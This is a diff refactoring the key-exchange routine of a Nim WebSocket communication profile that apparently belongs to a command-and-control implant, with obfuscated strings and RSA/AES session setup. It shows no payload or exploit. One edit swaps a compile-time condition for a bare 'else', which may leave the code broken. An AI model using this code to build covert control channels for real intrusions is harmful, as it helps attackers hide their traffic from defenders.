@@ -1,4 +1,4 @@
-import std/[base64, strutils, json, asyncdispatch, random, os, httpclient]
+import std/[base64, strutils, json, asyncdispatch, os]
 import ws
 import ../config
 import ../utils/crypto
@@ -7,7 +7,6 @@ import ../utils/strenc
 
 const encryptedExchange {.used.} = static: getEnv(obf("ENCRYPTED_EXCHANGE_CHECK"), "false").toLowerAscii in ["true", "t"]
 when encryptedExchange:
-  import ../utils/rsa
   import ../utils/key_exchange
 
 when defined(windows):
@@ -246,21 +245,21 @@ proc performKeyExchange*(profile: var WebSocketProfile): tuple[success: bool, ne
     return (true, "")
   
   # Use shared key exchange implementation
-  when encryptedExchange:
+  else:
     # Create a send wrapper that matches the expected signature
     var p = profile  # Create capturable local reference
     proc sendWrapper(data: string, uuid: string): string =
       return p.send(data, uuid)
     
-    let result = performRsaKeyExchange(profile.config, profile.config.uuid, sendWrapper)
+    let exchangeResult = performRsaKeyExchange(profile.config, profile.config.uuid, sendWrapper)
     
-    if result.success and result.sessionKey.len > 0:
+    if exchangeResult.success and exchangeResult.sessionKey.len > 0:
       # Set the AES key
-      profile.setAesKey(result.sessionKey)
-      return (true, result.newUuid)
-    elif result.success:
+      profile.setAesKey(exchangeResult.sessionKey)
+      return (true, exchangeResult.newUuid)
+    elif exchangeResult.success:
       # No key exchange needed (AESPSK mode)
       return (true, "")
     else:
-      debug "[DEBUG] Key exchange failed: ", result.error
+      debug "[DEBUG] Key exchange failed: ", exchangeResult.error
       return (false, "")
